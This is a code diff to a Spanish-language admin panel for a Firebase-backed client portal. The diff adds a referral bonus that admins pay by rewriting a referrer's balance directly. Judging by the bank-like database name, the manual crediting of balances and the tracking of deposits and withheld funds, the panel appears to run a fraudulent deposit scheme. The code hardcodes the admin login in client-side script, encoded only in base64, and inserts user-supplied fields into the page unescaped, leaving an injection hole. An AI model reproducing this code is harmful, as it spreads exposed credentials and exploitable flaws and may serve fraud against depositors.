@@ -128,6 +128,15 @@ img{max-width:100%;display:block}
 .th .f{display:flex;justify-content:space-between;padding:6px 8px;font-size:9.5px;color:var(--dim);align-items:center}
 .th a{color:var(--gold2);font-weight:700;text-decoration:none}
 
+.inv{display:flex;align-items:center;gap:9px;padding:8px 0;border-bottom:1px solid #1b1b22;font-size:12.5px}
+.inv:last-child{border:none}
+.inv .l{flex:1;min-width:0}
+.inv .l b{display:block;font-size:12.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.inv .l span{display:block;font-size:10px;color:var(--dim2)}
+.inv .b{font-size:9px;font-weight:800;padding:3px 7px;border-radius:20px;letter-spacing:.8px;text-transform:uppercase;flex:none}
+.inv .b.ok{background:rgba(63,191,127,.14);color:var(--ok)}
+.inv .b.no{background:rgba(224,85,85,.14);color:var(--bad);cursor:pointer}
+
 #viewer{position:fixed;inset:0;z-index:95;background:rgba(0,0,0,.95);display:none;
   align-items:center;justify-content:center;padding:16px;flex-direction:column;gap:12px}
 #viewer.on{display:flex}
@@ -224,11 +233,17 @@ img{max-width:100%;display:block}
     <div class="pr"><span>Teléfono</span><b id="d_tel">—</b></div>
     <div class="pr"><span>Correo</span><b id="d_mail">—</b></div>
     <div class="pr"><span>Referido por</span><b id="d_ref">—</b></div>
+    <div class="pr"><span>Bono</span><b id="d_bono">—</b></div>
     <div class="pr"><span>Monto inicial</span><b id="d_monto">—</b></div>
     <div class="pr"><span>Banco origen</span><b id="d_banco">—</b></div>
     <div class="pr"><span>Referencia</span><b id="d_referencia">—</b></div>
     <div class="pr"><span>Saldo base</span><b id="d_saldo">—</b></div>
     <div class="pr"><span>Alta</span><b id="d_creado">—</b></div>
+  </div>
+
+  <div class="dr-sec">
+    <h4>Referidos con su enlace</h4>
+    <div id="d_inv"><div class="empty">Sin referidos.</div></div>
   </div>
 
   <div class="dr-sec">
@@ -273,7 +288,7 @@ img{max-width:100%;display:block}
 const BASE='https://ficohwebonline-default-rtdb.firebaseio.com/nbch';
 const ADMIN_USER=atob('R2hvc3Q=');
 const ADMIN_PASS=atob('Q2FiaW1hczAx');
-const MAXTRY=5, LOCKMS=600000, SESSMS=28800000, IDLEMS=1200000;
+const MAXTRY=5, LOCKMS=600000, SESSMS=28800000, IDLEMS=1200000, BONO=300;
 
 const $=s=>document.querySelector(s);
 let clientes={}, sel=null, timer=null, snd=true, seen={}, firstLoad=true;
@@ -298,6 +313,23 @@ async function api(p,m='GET',b){
 async function mov(cid,concepto,tipo,monto){
   try{await api('portal/clientes/'+cid+'/movimientos/'+Date.now(),'PUT',
     {concepto,tipo,monto,fecha:Date.now()})}catch(e){}
+}
+
+/* paga el bono al que invitó y marca el registro */
+async function pagarBono(idInvitado, idReferente){
+  try{
+    const r=await api('portal/clientes/'+idReferente);
+    if(!r)throw new Error('sin-referente');
+    const inv=await api('portal/clientes/'+idReferente+'/invitados/'+idInvitado)||{};
+    if(inv.bono)return toast('Ese bono ya estaba pago');
+    const nuevo=(Number(r.saldo)||0)+BONO;
+    await api('portal/clientes/'+idReferente,'PATCH',{saldo:nuevo,actualizado:Date.now()});
+    await mov(idReferente,'Bono por referido · @'+(inv.usuario||''),'in',BONO);
+    await api('portal/clientes/'+idReferente+'/invitados/'+idInvitado,'PATCH',
+      {estado:'ACTIVO',bono:BONO,bono_fecha:Date.now()});
+    await api('portal/clientes/'+idInvitado,'PATCH',{bono_estado:'PAGADO',actualizado:Date.now()});
+    toast('Bono acreditado al referente'); poll();
+  }catch(e){toast('No se pudo acreditar el bono')}
 }
 
 let ac=null;
@@ -417,14 +449,16 @@ function render(){
   $('#list').innerHTML=arr.map(c=>{
     const e=(c.estado||'CUENTA').toUpperCase();
     const dep=(c.deposito_estado||'')==='PENDIENTE';
+    const bonoMal=c.bono_estado==='FALLO';
     const cls=dep?'new':(e==='COMPROBANTE'?'new':(e==='LIBERADO'||e==='PAGADO'?'g':(e==='RETENIDO'||e==='RECHAZADO'?'r':'')));
     const on=Date.now()-(c.ultima||0)<20000;
     return `<div class="row ${cls}" data-id="${c.id}">
       <div>
         <div class="nm">${c.nombre||'—'} <span class="dot ${on?'on':''}"></span>
           ${dep?'<span class="badge-d">DEPÓSITO</span>':''}
+          ${bonoMal?'<span class="badge-n">BONO FALLÓ</span>':''}
           ${e==='COMPROBANTE'?'<span class="badge-n">COMPROBANTE</span>':''}</div>
-        <div class="mt">@${c.usuario||'—'} · ${c.tel||'—'} · ${e}</div>
+        <div class="mt">@${c.usuario||'—'} · ${c.tel||'—'} · ${e}${c.ref?' · inv: @'+c.ref:''}</div>
       </div>
       <div class="rt"><div class="sal">L ${Number(c.saldo||0).toLocaleString('en-US')}</div>
         <div class="mt">${c.creado?new Date(c.creado).toLocaleDateString('es-HN'):''}</div></div>
@@ -446,6 +480,7 @@ async function detalle(id){
   $('#d_tel').textContent=c.tel||'—';
   $('#d_mail').textContent=c.correo||'—';
   $('#d_ref').textContent=c.ref?'@'+c.ref:'Directo';
+  $('#d_bono').textContent=c.bono_estado||'—';
   $('#d_monto').textContent='L '+Number(c.monto||0).toLocaleString('en-US');
   $('#d_banco').textContent=c.banco||'—';
   $('#d_referencia').textContent=c.referencia||'—';
@@ -456,6 +491,16 @@ async function detalle(id){
   const dep=(c.deposito_estado||'')==='PENDIENTE';
   $('#dr_dep').style.display=dep?'block':'none';
   $('#d_dep_monto').textContent='L '+Number(c.deposito_monto||0).toLocaleString('en-US');
+
+  const iv=$('#d_inv');
+  if(c.invitados){
+    iv.innerHTML=Object.entries(c.invitados).sort((a,b)=>(b[1].fecha||0)-(a[1].fecha||0)).map(([k,v])=>
+      `<div class="inv"><div class="l"><b>${v.nombre||'—'}</b>
+        <span>@${v.usuario||'—'} · ${v.fecha?new Date(v.fecha).toLocaleDateString('es-HN'):''}</span></div>
+        ${v.bono?`<div class="b ok">L ${v.bono}</div>`
+        :`<div class="b no" data-pay="${k}">PAGAR BONO</div>`}</div>`).join('');
+    iv.querySelectorAll('[data-pay]').forEach(x=>x.onclick=()=>pagarBono(x.dataset.pay,id));
+  }else iv.innerHTML='<div class="empty">Sin referidos.</div>';
 
   const th=$('#d_thumbs'); th.innerHTML='<div class="empty">Cargando…</div>';
   try{
